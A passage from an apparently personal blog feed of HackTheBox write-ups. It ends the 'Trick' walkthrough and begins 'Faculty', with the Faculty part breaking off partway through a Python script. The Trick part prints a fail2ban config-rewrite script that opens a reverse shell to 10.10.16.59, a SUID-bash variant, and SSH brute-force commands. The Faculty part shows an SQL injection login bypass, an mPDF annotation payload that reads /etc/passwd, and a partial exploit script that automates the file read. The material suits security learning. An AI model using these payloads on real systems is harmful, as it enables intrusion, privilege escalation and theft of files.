<p>I can see that <em>michael</em> is part of <em>security</em> group (using <code>id</code> command), and if I run <code>sudo -l</code> I get the following results:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>michael@trick:~$ sudo -l
</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> michael on trick:
</span></span><span style="display:flex;"><span>    env_reset, mail_badpass, secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>User michael may run the following commands on trick:
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /etc/init.d/fail2ban restart
</span></span></code></pre></div><p>User <em>michael</em> can restart <a href="https://www.fail2ban.org/wiki/index.php/Main_Page"><em>fail2ban</em></a> service, which is a service that monitors log files for certain services like apache and SSH looking for any sign of bruteforce and blocks the corresponding IP address.
In addition, if I search for files owned by <em>security</em> group:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>michael@trick:~$ find / -group security 2&gt;/dev/null
</span></span><span style="display:flex;"><span>/etc/fail2ban/action.d
</span></span></code></pre></div><p>I can see that <em>action.d</em> directory of <a href="https://www.fail2ban.org/wiki/index.php/Main_Page"><em>fail2ban</em></a> service is owned by security group, so I might be able to abuse this for privilege escalation to root.</p>
<h2 id="getting-root">Getting root</h2>
<ul>
<li>References:
<ul>
<li>How fail2ban exactly works (config files &hellip;): <a href="https://www.digitalocean.com/community/tutorials/how-fail2ban-works-to-protect-services-on-a-linux-server">https://www.digitalocean.com/community/tutorials/how-fail2ban-works-to-protect-services-on-a-linux-server</a></li>
<li><em>Abuse</em> write permission to files inside <em>action.d</em> folder: <a href="https://grumpygeekwrites.wordpress.com/2021/01/29/privilege-escalation-via-fail2ban/">https://grumpygeekwrites.wordpress.com/2021/01/29/privilege-escalation-via-fail2ban/</a></li>
</ul>
</li>
</ul>
<p>Even though I have write permission on <em>action.d</em> directory, I do not have write permission to any file inside it, which means that I cannot override any file, however I can <em>create</em> and <em>move</em> files around (or better said <em>rename</em> files).</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>michael@trick:/etc/fail2ban/action.d$ ls -la
</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">288</span>
</span></span><span style="display:flex;"><span>drwxrwx--- <span style="color:#ae81ff">2</span> root security  <span style="color:#ae81ff">4096</span> Oct <span style="color:#ae81ff">28</span> 18:21 .
</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">6</span> root root      <span style="color:#ae81ff">4096</span> Oct <span style="color:#ae81ff">28</span> 18:21 ..
</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> root root      <span style="color:#ae81ff">3879</span> Oct <span style="color:#ae81ff">28</span> 18:21 abuseipdb.conf
</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> root root       <span style="color:#ae81ff">587</span> Oct <span style="color:#ae81ff">28</span> 18:21 apf.conf
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> root root      <span style="color:#ae81ff">1045</span> Oct <span style="color:#ae81ff">28</span> 18:21 ufw.conf
</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> root root      <span style="color:#ae81ff">6082</span> Oct <span style="color:#ae81ff">28</span> 18:21 xarf-login-attack.conf
</span></span></code></pre></div><ul>
<li>Files are only <em>writable</em> by root.</li>
</ul>
<p>From the jail configuration file (<em>/etc/fail2ban/jail.conf</em>), I can see:</p>
<pre tabindex="0"><code>...
bantime  = 10s
...
findtime  = 10s
...
maxretry = 5
...
banaction = iptables-multiport
...
</code></pre><p>Which means that the <em>ban action</em> will be triggered upon <em>5 unsuccessful login within 10 seconds</em> and will last for 10 seconds. And the file responsible for the ban action is <em>iptables-multiport.conf</em> (will get <em>executed</em> when <em>bruteforce</em> is detected).</p>
<p>So:</p>
<ul>
<li>I can <em>rename</em> the orginal file to <em>iptables-multiport.conf.bak</em> and <em>create</em> a new file that has the <em>same name and contents</em> in addition to my malicious code.</li>
<li>Change the permission of the file to be executable.</li>
<li>Then restart the service with <em>sudo</em> permission.</li>
<li>Finally trigger the ban action using <a href="https://github.com/vanhauser-thc/thc-hydra"><em>Hydra</em></a> or any other tool for bruteforcing.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>michael@trick:~$ cat pwn_reverse_shell.sh 
</span></span><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 1. rename the file</span>
</span></span><span style="display:flex;"><span>mv /etc/fail2ban/action.d/iptables-multiport.conf /etc/fail2ban/action.d/iptables-multiport.conf.bak
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 2. substitute the word `actionban` from the config file with `actionban = bash -c &#34;bash -i&gt;&amp; /dev/tcp/10.10.16.59/8989 0&gt;&amp;1&#34; \n#` to get a reverse shell</span>
</span></span><span style="display:flex;"><span>sed <span style="color:#e6db74">&#39;s/actionban/actionban = bash -c &#34;bash -i&gt;\&amp; \/dev\/tcp\/10.10.16.59\/8989 0&gt;\&amp;1&#34; \n#/&#39;</span> /etc/fail2ban/action.d/iptables-multiport.conf.bak &gt; /etc/fail2ban/action.d/iptables-multiport.conf
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 3. make the file executable and restart fail2ban service</span>
</span></span><span style="display:flex;"><span>chmod +x /etc/fail2ban/action.d/iptables-multiport.conf
</span></span><span style="display:flex;"><span>sudo /etc/init.d/fail2ban restart
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>michael@trick:~$ cat pwn_SUID.sh 
</span></span><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 1. rename the file</span>
</span></span><span style="display:flex;"><span>mv /etc/fail2ban/action.d/iptables-multiport.conf /etc/fail2ban/action.d/iptables-multiport.conf.bak
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 2. substitute the word `actionban` from the config file with `actionban = cp /bin/bash /tmp/newbash &amp;&amp; chmod u+s /tmp/newbash \n#` to get a new SUID bash executable in /tmp/ directory</span>
</span></span><span style="display:flex;"><span>sed <span style="color:#e6db74">&#39;s/actionban/actionban = cp \/bin\/bash \/tmp\/newbash \&amp;\&amp; chmod u+s \/tmp\/newbash \n#/&#39;</span> /etc/fail2ban/action.d/iptables-multiport.conf.bak &gt; /etc/fail2ban/action.d/iptables-multiport.conf
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 3. make the file executable and restart fail2ban service</span>
</span></span><span style="display:flex;"><span>chmod +x /etc/fail2ban/action.d/iptables-multiport.conf
</span></span><span style="display:flex;"><span>sudo /etc/init.d/fail2ban restart
</span></span></code></pre></div><p>I can either get a reverse shell or make a new <em>bash</em> executable as <em>SUID</em>.</p>
<ul>
<li>
<p>Bruteforce using <a href="https://github.com/vanhauser-thc/thc-hydra"><em>Hydra</em></a>:</p>
<ul>
<li><code>hydra -l root -P /usr/share/wordlists/rockyou.txt trick.htb ssh -t 6 -vvv</code></li>
</ul>
</li>
<li>
<p>Bruteforce using <a href="https://github.com/kevinburke/sshpass"><em>SSHPass</em></a></p>
<ul>
<li><code>for i in {1..10}; do  time sshpass -p &quot;test&quot; ssh root@trick.htb; done</code></li>
</ul>
</li>
</ul>
<p><img src="getting_root.png" alt="Getting root"></p>
]]></content>
        </item>
        
        <item>
            <title>Faculty</title>
            <link>https://mostxeon.github.io/posts/faculty/</link>
            <pubDate>Tue, 18 Oct 2022 20:50:11 +0300</pubDate>
            
            <guid>https://mostxeon.github.io/posts/faculty/</guid>
            <description>false</description>
            <content type="html"><![CDATA[<h2 id="initial-recon">Initial Recon</h2>
<h3 id="nmap">Nmap</h3>
<p>Starting with a full tcp port scan using nmap:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nmap -p- -A -vvv -oN nmap/all-tcp.txt 10.10.11.169
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Starting Nmap 7.93 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-10-18 20:17 EEST
</span></span><span style="display:flex;"><span>NSE: Loaded <span style="color:#ae81ff">155</span> scripts <span style="color:#66d9ef">for</span> scanning.
</span></span><span style="display:flex;"><span>NSE: Script Pre-scanning.
</span></span><span style="display:flex;"><span>NSE: Starting runlevel <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>of 3<span style="color:#f92672">)</span> scan.
</span></span><span style="display:flex;"><span>Initiating NSE at 20:17
</span></span><span style="display:flex;"><span>Completed NSE at 20:17, 0.00s elapsed
</span></span><span style="display:flex;"><span>NSE: Starting runlevel <span style="color:#ae81ff">2</span> <span style="color:#f92672">(</span>of 3<span style="color:#f92672">)</span> scan.
</span></span><span style="display:flex;"><span>Initiating NSE at 20:17
</span></span><span style="display:flex;"><span>Completed NSE at 20:17, 0.00s elapsed
</span></span><span style="display:flex;"><span>NSE: Starting runlevel <span style="color:#ae81ff">3</span> <span style="color:#f92672">(</span>of 3<span style="color:#f92672">)</span> scan.
</span></span><span style="display:flex;"><span>Initiating NSE at 20:17
</span></span><span style="display:flex;"><span>Completed NSE at 20:17, 0.00s elapsed
</span></span><span style="display:flex;"><span>Initiating Ping Scan at 20:17
</span></span><span style="display:flex;"><span>Scanning 10.10.11.169 <span style="color:#f92672">[</span><span style="color:#ae81ff">2</span> ports<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>Completed Ping Scan at 20:17, 0.14s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> total hosts<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Initiating Parallel DNS resolution of <span style="color:#ae81ff">1</span> host. at 20:17
</span></span><span style="display:flex;"><span>Completed Parallel DNS resolution of <span style="color:#ae81ff">1</span> host. at 20:17, 0.03s elapsed
</span></span><span style="display:flex;"><span>DNS resolution of <span style="color:#ae81ff">1</span> IPs took 0.03s. Mode: Async <span style="color:#f92672">[</span><span style="color:#75715e">#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]</span>
</span></span><span style="display:flex;"><span>Initiating Connect Scan at 20:17
</span></span><span style="display:flex;"><span>Scanning 10.10.11.169 <span style="color:#f92672">[</span><span style="color:#ae81ff">65535</span> ports<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>Discovered open port 80/tcp on 10.10.11.169
</span></span><span style="display:flex;"><span>Discovered open port 22/tcp on 10.10.11.169
</span></span><span style="display:flex;"><span>Completed Connect Scan at 20:43, 1568.84s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">65535</span> total ports<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Initiating Service scan at 20:43
</span></span><span style="display:flex;"><span>Scanning <span style="color:#ae81ff">2</span> services on 10.10.11.169
</span></span><span style="display:flex;"><span>Completed Service scan at 20:43, 6.58s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">2</span> services on <span style="color:#ae81ff">1</span> host<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>NSE: Script scanning 10.10.11.169.
</span></span><span style="display:flex;"><span>NSE: Starting runlevel <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>of 3<span style="color:#f92672">)</span> scan.
</span></span><span style="display:flex;"><span>Initiating NSE at 20:43
</span></span><span style="display:flex;"><span>Completed NSE at 20:43, 3.94s elapsed
</span></span><span style="display:flex;"><span>NSE: Starting runlevel <span style="color:#ae81ff">2</span> <span style="color:#f92672">(</span>of 3<span style="color:#f92672">)</span> scan.
</span></span><span style="display:flex;"><span>Initiating NSE at 20:43
</span></span><span style="display:flex;"><span>Completed NSE at 20:43, 0.62s elapsed
</span></span><span style="display:flex;"><span>NSE: Starting runlevel <span style="color:#ae81ff">3</span> <span style="color:#f92672">(</span>of 3<span style="color:#f92672">)</span> scan.
</span></span><span style="display:flex;"><span>Initiating NSE at 20:43
</span></span><span style="display:flex;"><span>Completed NSE at 20:43, 0.00s elapsed
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.169
</span></span><span style="display:flex;"><span>Host is up, received syn-ack <span style="color:#f92672">(</span>0.14s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Scanned at 2022-10-18 20:17:22 EEST <span style="color:#66d9ef">for</span> 1580s
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65533</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>PORT   STATE SERVICE REASON  VERSION
</span></span><span style="display:flex;"><span>22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ssh-hostkey: 
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">3072</span> e9418ce5544d6f14987616e7292d0216 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCzpbkoBfa0UKxT+Giw4wE1jz82gGRpuANEdRt+D6gp6hDmrcaODUiU/N+4nX08jcFBk103cLwU8VisxyRu3wHMTHXaYx2WMZXPtb8clv3Hrt+q2m4eL+DBJMkHO10qCx1IwfYcNyJA3CNCj88X8RgWIREalYWyNHeQFzAHZx4SSrCP9aW5QKqAYVAAS4Za0pts4HVYlfuOrxFgO/Z3FL3xynYeyLrFM+iEx0cMl9rIYWG8NzqVnBe180u+7d/y/kcsZU6MkBMmqWQlGA6o4srVx73AqbUDChkv8glvq0ZbD1JYmACuMCdn/GFI8lRlKaw1BaYeuP0l6qgbb65ghdECYEXC3iycPkR77D6gMbIbg4F9wvzD9AF//aCR+6t8F29DyP/mh1J8a+yiUHY2HJJaDvB5vQLg5Y++9yNEDmxlGFQTdJm/n7YhP2Qj+lkfgsERAO9pfIWGCCWaXl6fddUG4gp1bHLZkek+exgsimU7hApGFrJCtYPkf78xC3pvxx0<span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 4375103ecb78e9520eebcf7ffdf66d3d <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDH8WAd+YlbEo4Fpz3+UaOYyCJGFa/E29JORgMAIOXVlGUpvMgQqiaqDMXtbt/G03rGEI9h8dpFAmswN1LJ8uig<span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> c11caf762b56e8b3b88ae969737be6f5 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINSCwKublVScg9d/3Tc/NAh0n9XH5lE9SBfl2dl+v6F+
</span></span><span style="display:flex;"><span>80/tcp open  http    syn-ack nginx 1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to http://faculty.htb
</span></span><span style="display:flex;"><span>| http-methods: 
</span></span><span style="display:flex;"><span>|_  Supported Methods: GET HEAD POST OPTIONS
</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>NSE: Script Post-scanning.
</span></span><span style="display:flex;"><span>NSE: Starting runlevel <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>of 3<span style="color:#f92672">)</span> scan.
</span></span><span style="display:flex;"><span>Initiating NSE at 20:43
</span></span><span style="display:flex;"><span>Completed NSE at 20:43, 0.00s elapsed
</span></span><span style="display:flex;"><span>NSE: Starting runlevel <span style="color:#ae81ff">2</span> <span style="color:#f92672">(</span>of 3<span style="color:#f92672">)</span> scan.
</span></span><span style="display:flex;"><span>Initiating NSE at 20:43
</span></span><span style="display:flex;"><span>Completed NSE at 20:43, 0.00s elapsed
</span></span><span style="display:flex;"><span>NSE: Starting runlevel <span style="color:#ae81ff">3</span> <span style="color:#f92672">(</span>of 3<span style="color:#f92672">)</span> scan.
</span></span><span style="display:flex;"><span>Initiating NSE at 20:43
</span></span><span style="display:flex;"><span>Completed NSE at 20:43, 0.00s elapsed
</span></span><span style="display:flex;"><span>Read data files from: /usr/bin/../share/nmap
</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 1580.64 seconds
</span></span></code></pre></div><p>I can see from the above results 2 open ports <em>80 and 22</em>.</p>
<h2 id="inspecting-web-page">Inspecting Web Page</h2>
<p>Inspecting the webpage on <em>port 80</em>, it redirects me to <em>faculty.htb</em> so I&rsquo;ll add that to my <em>/etc/hosts</em> file.</p>
<p>A login page was the first page that appeared to us.</p>
<p><img src="login_page.png" alt="Login Page"></p>
<h3 id="bypassing-login-using-sqli">Bypassing Login Using SQLI</h3>
<p>The first thing I tried was a simple sql injection: <em>&lsquo;or &lsquo;1&rsquo;=&lsquo;1</em> and it worked.</p>
<p><img src="sql_injection_login_page.png" alt="SQLI Login Page"></p>
<p><img src="sqli_worked.png" alt="SQLI Worked"></p>
<h3 id="getting-the-admin-panel">Getting The Admin Panel</h3>
<p>After inspecting the source code of this single page, I saw stylesheet link pointing to <em>admin directory</em>, so I tried to navigate to this directory, and I got the admin panel.</p>
<p><img src="locating_admin_directory.png" alt="Source Code Inspection"></p>
<p><img src="admin_panel.png" alt="Admin Panel"></p>
<h3 id="exporting-pdfs">Exporting PDFs</h3>
<p>After navigating through the pages I found that I can export some data as <em>pdf</em>, like the <em>course list</em> and <em>subject list</em>, so I&rsquo;ll try to export them and see if I can get more information from these pdfs.</p>
<p><img src="viewing_export_pdf_button.png" alt="Export PDF"></p>
<p>By looking at the <em>URL</em>, it seems that they are using mpdf to generate these pdfs.</p>
<p><img src="seeing_mpdf_in_the_url.png" alt="Noticing MPDF In URL"></p>
<p>To get more information about which version is used I can download the pdf and use exiftool on it to see if there is an entry for the version or other useful information.</p>
<p><img src="download_button_for_pdf.png" alt="Download PDF"></p>
<p>Using exiftool:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ exiftool OKTLw2f4x5ZgiEUChnypRQ0tWb.pdf 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ExifTool Version Number         : 12.44
</span></span><span style="display:flex;"><span>File Name                       : OKTLw2f4x5ZgiEUChnypRQ0tWb.pdf
</span></span><span style="display:flex;"><span>Directory                       : .
</span></span><span style="display:flex;"><span>File Size                       : <span style="color:#ae81ff">1745</span> bytes
</span></span><span style="display:flex;"><span>File Modification Date/Time     : 2022:10:18 21:30:50+03:00
</span></span><span style="display:flex;"><span>File Access Date/Time           : 2022:10:18 21:30:50+03:00
</span></span><span style="display:flex;"><span>File Inode Change Date/Time     : 2022:10:18 21:30:50+03:00
</span></span><span style="display:flex;"><span>File Permissions                : -rw-r--r--
</span></span><span style="display:flex;"><span>File Type                       : PDF
</span></span><span style="display:flex;"><span>File Type Extension             : pdf
</span></span><span style="display:flex;"><span>MIME Type                       : application/pdf
</span></span><span style="display:flex;"><span>PDF Version                     : 1.4
</span></span><span style="display:flex;"><span>Linearized                      : No
</span></span><span style="display:flex;"><span>Page Count                      : <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>Page Layout                     : OneColumn
</span></span><span style="display:flex;"><span>Producer                        : mPDF 6.0
</span></span><span style="display:flex;"><span>Create Date                     : 2022:10:18 19:27:39+01:00
</span></span><span style="display:flex;"><span>Modify Date                     : 2022:10:18 19:27:39+01:00
</span></span></code></pre></div><p>I can see that the version used is <em>mPDF 6.0</em> so now I can search specifically for exploits of this version if they exist.</p>
<h3 id="understanding-how-data-is-sent-and-processed-to-generate-pdfs">Understanding How Data Is Sent And Processed To Generate PDFs</h3>
<p>First I need to understand how data is processed to generate these pdf files, so I&rsquo;ll intercept the <em>export pdf</em> request using <em>Burp Suite</em>.</p>
<p><img src="clicking_pdf_download.png" alt="Export PDF"></p>
<p><img src="intercepting_request.png" alt="Intercepting Request"></p>
<p>Looks like <em>/admin/download.php</em> expects a <em>POST</em> request having the content of the pdf file to generate in the body of this request <em>URL encoded 2 times then Base64 encoded</em>.</p>
<p>This opens for me a new attack surface, because now I can try to inject our payloads after encoding it and let <em>mpdf 6.0</em> process it.</p>
<h3 id="locating-mpdf-lfi-exploit">Locating MPDF LFI Exploit</h3>
<p>After searching a little bit about mpdf 6.0 exploits, I saw this issue on <a href="https://github.com/mpdf/mpdf/issues/356"><em>github</em></a>. I also found this <a href="https://medium.com/@jonathanbouman/local-file-inclusion-at-ikea-com-e695ed64d82f"><em>blog</em></a> talking about a very similar approach to the vulnerability.</p>
<h3 id="exploiting-the-vulnerability">Exploiting the vulnerability</h3>
<p>A user can include files by injecting html code into a pdf file and thus read arbitrary files from the server, and mpdf 6.0 was affected by that. In order to read files, I need to download the pdf and open it with a pdf viewer to be able to click on the annotation marker and read the file&rsquo;s content.</p>
<p>This is the payload I&rsquo;ll use:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>Payload: &lt;<span style="color:#f92672">annotation</span> <span style="color:#a6e22e">file</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/etc/passwd&#34;</span> <span style="color:#a6e22e">content</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/etc/passwd&#34;</span>  <span style="color:#a6e22e">icon</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Graph&#34;</span> <span style="color:#a6e22e">title</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Attached File: /etc/passwd&#34;</span> <span style="color:#a6e22e">pos-x</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;195&#34;</span> /&gt;
</span></span><span style="display:flex;"><span>Base64 encoded: PGFubm90YXRpb24lMmJmaWxlJTI1M2QiL2V0Yy9wYXNzd2QiJTJiY29udGVudCUyNTNkIi9ldGMvcGFzc3dkIiUyYiUyYmljb24lMjUzZCJHcmFwaCIlMmJ0aXRsZSUyNTNkIkF0dGFjaGVkJTJiRmlsZSUyNTNhJTJiL2V0Yy9wYXNzd2QiJTJicG9zLXglMjUzZCIxOTUiJTJiLz4=
</span></span></code></pre></div><p><img src="sending_etcpasswd_payload.png" alt="Sending /etc/passwd Payload"></p>
<p>Got the pdf name, and since I already saw the path to get the pdf I can navigate to it.</p>
<p><img src="downloading_etcpasswd_pdf.png" alt="Downloading /etc/passwd pdf"></p>
<p>The pdf looks empty and this because I opened it using firefox, so the annotation mark will not appear, that&rsquo;s why I need to download it and open it with a proper pdf viewer. (I&rsquo;ll use kali&rsquo;s default pdf viewer <em>Atril Document Viewer</em>)</p>
<p><img src="Seeing_etcpasswd_attachment.png" alt="Viewing /etc/passwd Annotation Mark"></p>
<p>Upon clicking the annotation, a new window will popup showing the contents of the file.</p>
<p><img src="reading_etcpasswd_from_annotation.png" alt="Reading /etc/passwd from Annotation"></p>
<p>I wrote a <em>python3 script</em> that will automate all this work otherwise it will be painfull to download every pdf manually and then open it to read the contents.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> urllib.parse
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> base64
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> io
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> PyPDF2
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>:
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Please provide a filename as argument&#34;</span>)
</span></span><span style="display:flex;"><span>    exit(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>fileToRead <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>getPdfURL <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://faculty.htb/admin/download.php&#34;</span>
</span></span><span style="display:flex;"><span>downloadPdfURL <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://faculty.htb/mpdf/tmp/&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&lt;annotation file=&#34;</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34; content=&#34;</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;  icon=&#34;Graph&#34; title=&#34;Attached File: </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34; pos-x=&#34;195&#34; /&gt;&#39;</span><span style="color:#f92672">.</span>format(fileToRead,fileToRead,fileToRead)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> urllib<span style="color:#f92672">.</span>parse<span style="color:#f92672">.</span>quote(payload)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> urllib<span style="color:#f92672">.</span>parse<span style="color:#f92672">.</span>quote(payload)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64encode(payload<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#39;ascii&#39;</span>))<span style="color:#f92672">.</span>decode()
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;[!] Base64 encoded payload: </span><span style="color:#e6db74">{}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(payload))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>headers <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;Content-Type&#39;</span>: <span style="color:#e6db74">&#39;application/x-www-form-urlencoded; charset=UTF-8&#39;</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>pdfName <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(getPdfURL, data<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;pdf=</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(payload), headers<span style="color:#f92672">=</span>headers)<span style="color:#f92672">.</span>text<span style="color:#f92672">.</span>strip()
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;[+] Got filename: </span><span style="color:#e6db74">{}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(pdfName))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pdfContent <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(downloadPdfURL <span style="color:#f92672">+</span> pdfName)<span style="color:#f92672">.</span>content
</span></span><span style="display:flex;"><span>pdf <span style="color:#f92672">=</span> PyPDF2<span style="color:#f92672">.</span>PdfReader(io<span style="color:#f92672">.</span>BytesIO(pdfContent))
</span></span><span style="display:flex;"><span>catalog <span style="color:#f92672">=</span> pdf<span style="color:#f92672">.</span>trailer[<span style="color:#e6db74">&#39;/Root&#39;</span>]
</span></span><span style="display:flex;"><span>
